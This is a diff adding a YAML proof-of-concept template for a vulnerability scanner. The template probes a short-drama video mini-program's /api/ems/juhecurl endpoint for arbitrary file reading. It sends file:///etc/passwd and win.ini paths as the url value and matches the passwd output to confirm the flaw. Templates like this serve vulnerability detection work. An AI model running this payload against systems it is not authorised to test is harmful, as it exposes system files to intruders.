@@ -1,0 +1,23 @@
+id: poc-yaml-movie-app-juhecurl-any-fileread
+info:
+  name: 短剧影视小程序前台juhecurl任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 小剧场短剧影视小程序
+  fofa: /VwmRIfEYDH.php
+variables:
+  data: 'file:///etc/passwd
+
+    file:///c://windows/win.ini'
+firstRequest:
+  method: GET
+  path: /
+  expression: "status_code == 200 && \ncontains(body,\"VwmRIfEYDH.php\")\n"
+requests:
+- method: POST
+  path: /api/ems/juhecurl?url={{.data}}
+  expression: "status_code == 200 &&\n(\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n)\n"
+transport: http
